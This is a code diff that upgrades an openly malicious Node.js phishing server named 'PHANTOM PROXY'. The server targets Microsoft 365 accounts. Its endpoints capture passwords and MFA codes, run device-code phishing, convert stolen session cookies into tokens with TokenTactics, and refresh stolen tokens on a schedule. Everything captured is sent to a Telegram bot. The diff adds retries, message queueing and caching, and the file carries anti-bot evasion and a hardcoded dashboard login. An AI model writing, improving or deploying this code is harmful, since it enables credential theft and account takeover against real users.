-// ── ✅ CAPTURE CREDENTIALS FROM AITM ──
 dashApp.post('/api/capture/credentials', async (req, res) => {
     const { email, password, sessionId, userAgent, ip } = req.body;
-    
-    console.log(`🔑 Credentials captured from ${email}`);
-    console.log(`   Password: ${password}`);
-    console.log(`   Session: ${sessionId}`);
-    console.log(`   IP: ${ip}`);
-    console.log(`   User-Agent: ${userAgent}`);
+
+    logInfo(`Credentials captured from ${email}`);
+    logInfo(`   Password: ${password}`);
+    logInfo(`   Session: ${sessionId}`);
+    logInfo(`   IP: ${ip}`);
+    logInfo(`   User-Agent: ${userAgent}`);
 
     const message = `
 🔑 **Credentials Captured!**
@@ -2172,15 +2296,17 @@ dashApp.post('/api/capture/credentials', async (req, res) => {
 🖥️ **User-Agent:** ${userAgent || 'Unknown'}
 🕒 **Time:** ${new Date().toISOString()}
     `;
-    
+
     try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
+        await retry(async () => {
+            return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            }, { timeout: 3000 });
+        }, 2, 1000, 2);
     } catch (e) {
-        console.log('⚠️ Telegram notify failed:', e.message);
+        logError('Telegram notify failed:', e.message);
     }
 
     vault.tokens.push({
@@ -2195,10 +2321,9 @@ dashApp.post('/api/capture/credentials', async (req, res) => {
     res.json({ success: true });
 });
 
-// ── ✅ NOTIFY DEVICE CODE GENERATED ──
 dashApp.post('/api/notify/device-code', async (req, res) => {
     const { code, sessionId, expiresIn } = req.body;
-    
+
     const message = `
 📱 **Device Code Generated!**
 🔢 **Code:** \`${code}\`
@@ -2207,27 +2332,28 @@ dashApp.post('/api/notify/device-code', async (req, res) => {
 🔗 **Verification URL:** https://login.microsoft.com/device
 🕒 **Time:** ${new Date().toISOString()}
     `;
-    
+
     try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
+        await retry(async () => {
+            return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            }, { timeout: 3000 });
+        }, 2, 1000, 2);
     } catch (e) {
-        console.log('⚠️ Telegram notify failed:', e.message);
+        logError('Telegram notify failed:', e.message);
     }
 
     res.json({ success: true });
 });
 
-// ── ✅ CONVERT ESCTX TO TOKEN (TokenTactics Integration) ──
 dashApp.post('/api/convert/esctx-to-token', async (req, res) => {
     const { esctx, resource = 'MSGraph' } = req.body;
     if (!esctx) {
         return res.status(400).json({ error: 'ESTSAuth cookie required' });
     }
-    
+
     try {
         const psScript = `
             Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
@@ -2238,10 +2364,10 @@ dashApp.post('/api/convert/esctx-to-token', async (req, res) => {
                 Write-Error $_.Exception.Message
             }
         `;
-        
+
         exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
             if (error) {
-                console.error('PowerShell error:', stderr);
+                logError('PowerShell error:', stderr);
                 return res.status(500).json({ error: stderr || error.message });
             }
             try {
@@ -2267,13 +2393,12 @@ dashApp.post('/api/convert/esctx-to-token', async (req, res) => {
     }
 });
 
-// ── ✅ CONVERT SCCAUTH TO TOKEN ──
 dashApp.post('/api/convert/sccauth-to-token', async (req, res) => {
     const { sccauth, resource = 'MSGraph' } = req.body;
     if (!sccauth) {
         return res.status(400).json({ error: 'SCCAUTH cookie required' });
     }
-    
+
     try {
         const psScript = `
             Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
@@ -2284,10 +2409,10 @@ dashApp.post('/api/convert/sccauth-to-token', async (req, res) => {
                 Write-Error $_.Exception.Message
             }
         `;
-        
+
         exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
             if (error) {
-                console.error('PowerShell error:', stderr);
+                logError('PowerShell error:', stderr);
                 return res.status(500).json({ error: stderr || error.message });
             }
             try {
@@ -2312,20 +2437,15 @@ dashApp.post('/api/convert/sccauth-to-token', async (req, res) => {
     }
 });
 
-console.log('📧 /verify page endpoints loaded');
-console.log('🔄 esctx/sccauth conversion endpoints loaded');
+logInfo('📧 /verify page endpoints loaded');
+logInfo('🔄 esctx/sccauth conversion endpoints loaded');
 
-// ── ✅ 🔥🔥🔥 MAIN APP — DEFINED HERE 🔥🔥🔥 ──
+// ── ✅ MAIN APP ──
 const app = express();
 
-// ── ✅ CORS MIDDLEWARE ──
 app.use(corsMiddleware);
-
-// ── ✅ ANTI-BOT MIDDLEWARE ──
 app.use(antiBotMiddleware);
 app.use(botTrapMiddleware);
-
-// ── ✅ CRITICAL: JSON MIDDLEWARE ──
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -2370,7 +2490,7 @@ app.post('/device/request', async (req, res) => {
         return res.status(500).json({ error: 'axios not installed' });
     }
     try {
-        console.log('📱 Device code requested');
+        logInfo('📱 Device code requested');
         const clientId = getRandomClientId();
         const userAgent = getRandomUserAgent();
         await randomDelay(300, 800);
@@ -2380,14 +2500,16 @@ app.post('/device/request', async (req, res) => {
             client_id: clientId,
             scope: 'https://graph.microsoft.com/.default offline_access'
         });
-        console.log(`➡️ Sending request to: ${url}`);
-        console.log(`📦 Parameters: ${params.toString()}`);
 
         const config = getAxiosConfig();
         config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-        const response = await axios.post(url, params, config);
+
+        const response = await retry(async () => {
+            return await axios.post(url, params, config);
+        }, 3, 1500, 2);
+
         const data = response.data;
-        console.log('✅ Device code obtained:', data.user_code);
+        logInfo(`✅ Device code obtained: ${data.user_code}`);
 
         const newFlow = {
             device_code: data.device_code,
@@ -2427,11 +2549,11 @@ app.post('/device/request', async (req, res) => {
                 text: message,
                 parse_mode: 'Markdown'
             }, { timeout: 3000 });
-        } catch (e) { console.log('⚠️ Telegram notify failed but continuing'); }
+        } catch (e) { logWarn('Telegram notify failed but continuing'); }
 
         res.json(data);
     } catch (error) {
-        console.error('❌ Device code error:', error.response?.data || error.message);
+        logError('Device code error:', error.response?.data || error.message);
         res.status(500).json(error.response?.data || { error: error.message });
     }
 });
@@ -2446,7 +2568,7 @@ app.post('/device/token', async (req, res) => {
         return res.status(400).json({ error: 'device_code required' });
     }
     try {
-        console.log('🔄 Polling for token:', device_code);
+        logInfo(`🔄 Polling for token: ${device_code}`);
         const flow = deviceFlows.find(f => f.device_code === device_code);
         const clientId = flow?.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
         const userAgent = getRandomUserAgent();
@@ -2458,18 +2580,39 @@ app.post('/device/token', async (req, res) => {
             device_code: device_code,
             grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
         });
-        console.log(`➡️ Polling URL: ${url}`);
-        console.log(`📦 Params: ${params.toString()}`);
 
         const config = getAxiosConfig();
         config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-        const response = await axios.post(url, params, config);
-        const tokens = response.data;
-        console.log('✅ Tokens obtained!');
 
-        const tokenType = tokens.access_token ? 'Access Token' : 
-                         tokens.refresh_token ? 'Refresh Token' : 
-                         tokens.id_token ? 'ID Token' : 'Unknown';
+        const response = await retry(async () => {
+            return await axios.post(url, params, config);
+        }, 3, 1500, 2);
+
+        const tokens = response.data;
+        logInfo('✅ Tokens obtained!');
+
+        const tokenType = tokens.access_token ? 'Access Token' :
+            tokens.refresh_token ? 'Refresh Token' :
+            tokens.id_token ? 'ID Token' : 'Unknown';
+
+        let username = 'Unknown';
+        if (tokens.id_token) {
+            try {
+                const parts = tokens.id_token.split('.');
+                if (parts.length === 3) {
+                    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                    username = payload.email || payload.preferred_username || payload.upn || 'Unknown';
+                }
+            } catch (e) {}
+        } else if (tokens.access_token) {
+            try {
+                const parts = tokens.access_token.split('.');
+                if (parts.length === 3) {
+                    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                    username = payload.email || payload.preferred_username || payload.upn || 'Unknown';
+                }
+            } catch (e) {}
+        }
 
         if (flow) {
             flow.status = 'approved';
@@ -2478,12 +2621,7 @@ app.post('/device/token', async (req, res) => {
             flow.refresh_token = tokens.refresh_token;
             flow.id_token = tokens.id_token;
             flow.token_type = tokenType;
-            if (tokens.id_token) {
-                try {
-                    const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
-                    flow.username = payload.email || payload.preferred_username || 'Unknown';
-                } catch (e) {}
-            }
+            flow.username = username;
             saveDeviceFlows(deviceFlows);
         }
 
@@ -2491,8 +2629,8 @@ app.post('/device/token', async (req, res) => {
 📱 **Device Code Phishing - SUCCESS!**
 🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
 🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
-🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
-👤 **User:** ${flow?.username || 'Unknown'}
+🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30) || 'Not received'}...\`
+👤 **User:** ${username}
 📱 **Token Type:** ${tokenType}
         `;
         try {
@@ -2506,16 +2644,16 @@ app.post('/device/token', async (req, res) => {
         res.json(tokens);
     } catch (error) {
         if (error.response?.data?.error === 'authorization_pending') {
-            console.log('⏳ Still waiting for approval...');
+            logInfo('⏳ Still waiting for approval...');
             res.status(400).json({ error: 'authorization_pending' });
         } else if (error.response?.data?.error === 'expired_token') {
-            console.log('⏰ Code expired');
+            logInfo('⏰ Code expired');
             const flow = deviceFlows.find(f => f.device_code === device_code);
             if (flow) flow.status = 'expired';
             saveDeviceFlows(deviceFlows);
             res.status(400).json({ error: 'expired_token' });
         } else {
-            console.error('❌ Token error:', error.response?.data || error.message);
+            logError('Token error:', error.response?.data || error.message);
             res.status(500).json({ error: error.response?.data?.error_description || error.message });
         }
     }
@@ -2533,11 +2671,13 @@ app.post('/mfa/submit', async (req, res) => {
 🕒 **Time:** ${new Date().toISOString()}
     `;
     try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        }, { timeout: 3000 });
+        await retry(async () => {
+            return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            }, { timeout: 3000 });
+        }, 2, 1000, 2);
     } catch (e) {}
 
     res.json({ success: true, redirect: '/' });
@@ -2548,33 +2688,35 @@ app.use('/dash', dashApp);
 
 // ── ✅ TOKEN REFRESH DAEMON ──
 async function refreshTokensDaemon() {
-    console.log('🔄 Token Refresh Daemon started (every 30 min)');
+    logInfo('🔄 Token Refresh Daemon started (every 30 min)');
     setInterval(async () => {
-        console.log('🔄 Running token refresh cycle...');
+        logInfo('🔄 Running token refresh cycle...');
         for (const flow of deviceFlows) {
             if (flow.refresh_token && flow.status === 'approved') {
                 try {
-                    const response = await axios.post(
-                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                        new URLSearchParams({
-                            client_id: flow.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                            refresh_token: flow.refresh_token,
-                            grant_type: 'refresh_token',
-                            scope: 'https://graph.microsoft.com/.default offline_access'
-                        }),
-                        {
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            timeout: 10000
-                        }
-                    );
+                    const response = await retry(async () => {
+                        return await axios.post(
+                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                            new URLSearchParams({
+                                client_id: flow.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                                refresh_token: flow.refresh_token,
+                                grant_type: 'refresh_token',
+                                scope: 'https://graph.microsoft.com/.default offline_access'
+                            }),
+                            {
+                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                timeout: 10000
+                            }
+                        );
+                    }, 2, 1000, 2);
                     const data = response.data;
                     flow.access_token = data.access_token;
                     if (data.refresh_token) flow.refresh_token = data.refresh_token;
                     flow.last_refresh = new Date().toISOString();
                     saveDeviceFlows(deviceFlows);
-                    console.log(`✅ Refreshed tokens for flow ${flow.user_code}`);
+                    logInfo(`✅ Refreshed tokens for flow ${flow.user_code}`);
                 } catch (e) {
-                    console.log(`⚠️ Failed to refresh tokens for ${flow.user_code}:`, e.message);
+                    logWarn(`Failed to refresh tokens for ${flow.user_code}: ${e.message}`);
                 }
             }
         }
@@ -2589,29 +2731,139 @@ app.use((req, res) => {
     }
 });
 
+// ============================================================
+// 🗃️ INITIALIZE CACHE AND QUEUE
+// ============================================================
+global._cache = new CacheManager(300000);
+global._telegramQueue = [];
+
+// Load cache from disk
+try {
+    if (fs.existsSync('./cache_backup.json')) {
+        const backup = JSON.parse(fs.readFileSync('./cache_backup.json'));
+        if (backup.tokens) {
+            global._cache.set('tokens', backup.tokens, 3600000);
+        }
+        logInfo('Cache restored from disk');
+    }
+} catch (e) {}
+
+// Load telegram queue from disk
+try {
+    if (fs.existsSync('./telegram_queue.json')) {
+        const queue = JSON.parse(fs.readFileSync('./telegram_queue.json'));
+        global._telegramQueue = queue.filter(q => Date.now() - q.timestamp < 3600000);
+        logInfo(`Loaded ${global._telegramQueue.length} queued messages`);
+    }
+} catch (e) {}
+
+// ============================================================
+// 🧹 PERIODIC CACHE CLEANUP
+// ============================================================
+setInterval(() => {
+    if (global._cache) {
+        global._cache.clean();
+        const stats = global._cache.getStats();
+        logDebug(`Cache cleaned, stats: ${JSON.stringify(stats)}`);
+    }
+}, 60000);
+
+// ============================================================
+// 📤 TELEGRAM QUEUE PROCESSOR
+// ============================================================
+async function processTelegramQueue() {
+    const queue = global._telegramQueue || [];
+    if (queue.length === 0) return;
+
+    logInfo(`📤 Processing ${queue.length} queued Telegram messages`);
+    const toProcess = queue.slice(0, 10);
+    const remaining = queue.slice(10);
+
+    for (const item of toProcess) {
+        try {
+            await sendToTelegram(item.data);
+            logInfo('✅ Queued message sent');
+        } catch (error) {
+            logError('Failed to send queued message:', error.message);
+            if (Date.now() - item.timestamp < 3600000) {
+                remaining.push(item);
+            }
+        }
+    }
+
+    global._telegramQueue = remaining;
+    try {
+        fs.writeFileSync('./telegram_queue.json', JSON.stringify(remaining));
+    } catch (e) {}
+}
+setInterval(processTelegramQueue, 30000);
+
+// ============================================================
+// 🛑 GRACEFUL SHUTDOWN
+// ============================================================
+function setupGracefulShutdown(server, wss) {
+    const signals = ['SIGINT', 'SIGTERM', 'SIGQUIT'];
+
+    for (const signal of signals) {
+        process.on(signal, async () => {
+            logInfo(`🛑 Received ${signal}, shutting down gracefully...`);
+
+            server.close(() => {
+                logInfo('✅ HTTP server closed');
+            });
+
+            if (wss) {
+                for (const client of wss.clients) {
+                    client.close();
+                }
+                logInfo('✅ WebSocket connections closed');
+            }
+
+            try {
+                const cacheData = {
+                    tokens: global._cache ? global._cache.get('tokens') || [] : [],
+                    prts: global._cache ? global._cache.get('prts') || [] : [],
+                    timestamp: new Date().toISOString()
+                };
+                fs.writeFileSync('./cache_backup.json', JSON.stringify(cacheData, null, 2));
+                logInfo('✅ Cache saved to disk');
+            } catch (e) {
+                logError('Failed to save cache:', e.message);
+            }
+
+            saveDeviceFlows(deviceFlows);
+            logInfo('✅ Graceful shutdown complete');
+            process.exit(0);
+        });
+    }
+}
+
 // ── ✅ START SERVER ──
 const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v3.3 ULTIMATE running on port ${PORT}`);
-    console.log(`🔐 Dashboard: /dash (auth: svrpsdev/Cozysarps18!)`);
-    console.log(`📱 Device Code: /device`);
-    console.log(`🔢 MFA Intercept: /mfa`);
-    console.log(`📧 Webmail: /webmail`);
-    console.log(`📧 Verify Page: /verify`);
-    console.log(`🟣 PRT Vault: /dash#prt`);
-    console.log(`🔄 PRT Exchange: /api/prt/exchange`);
-    console.log(`🔄 Token Refresh Daemon: Active (every 30 min)`);
-    console.log(`🟣 PRT Auto-Refresh Daemon: Active (every 60 min)`);
-    console.log(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
-    console.log(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
-    console.log(`🛡️ Anti-Bot Protection: ACTIVE`);
-    console.log(`✅ All features integrated!`);
+    logInfo(`✅ PHANTOM PROXY v3.4 ULTIMATE running on port ${PORT}`);
+    logInfo(`🔐 Dashboard: /dash (auth: svrpsdev/Cozysarps18!)`);
+    logInfo(`📱 Device Code: /device`);
+    logInfo(`🔢 MFA Intercept: /mfa`);
+    logInfo(`📧 Webmail: /webmail`);
+    logInfo(`📧 Verify Page: /verify`);
+    logInfo(`🟣 PRT Vault: /dash#prt`);
+    logInfo(`🔄 PRT Exchange: /api/prt/exchange`);
+    logInfo(`🔄 Token Refresh Daemon: Active (every 30 min)`);
+    logInfo(`🟣 PRT Auto-Refresh Daemon: Active (every 60 min)`);
+    logInfo(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
+    logInfo(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
+    logInfo(`🛡️ Anti-Bot Protection: ACTIVE`);
+    logInfo(`🗃️ Cache Manager: Active (${global._cache ? global._cache.getStats().size : 0} items)`);
+    logInfo(`📤 Telegram Queue: ${global._telegramQueue ? global._telegramQueue.length : 0} pending`);
+    logInfo('✅ All features integrated!');
 });
 
 // ── ✅ WEBSOCKET SUPPORT ──
+let wss = null;
 if (WebSocket) {
-    const wss = new WebSocket.Server({ server });
+    wss = new WebSocket.Server({ server });
     let clients = [];
     wss.on('connection', (ws) => {
         clients.push(ws);
@@ -2630,17 +2882,22 @@ if (WebSocket) {
             }
         });
     } catch (err) {
-        console.warn('⚠️ File watching not available');
+        logWarn('File watching not available');
     }
 }
 
+// ── ✅ GRACEFUL SHUTDOWN SETUP ──
+setupGracefulShutdown(server, wss);
+
 // ── ✅ ERROR HANDLING ──
 process.on('uncaughtException', (err) => {
-    console.error('❌ Uncaught Exception:', err.message);
+    logError('Uncaught Exception:', err.message);
+    logError(err.stack);
 });
 
 process.on('unhandledRejection', (err) => {
-    console.error('❌ Unhandled Rejection:', err);
+    logError('Unhandled Rejection:', err);
 });
 
-console.log('✅ PHANTOM PROXY v3.3 ULTIMATE startup complete!');
+logInfo('✅ PHANTOM PROXY v3.4 ULTIMATE startup complete!');
+logInfo('🔥 All features integrated with caching & error handling.');
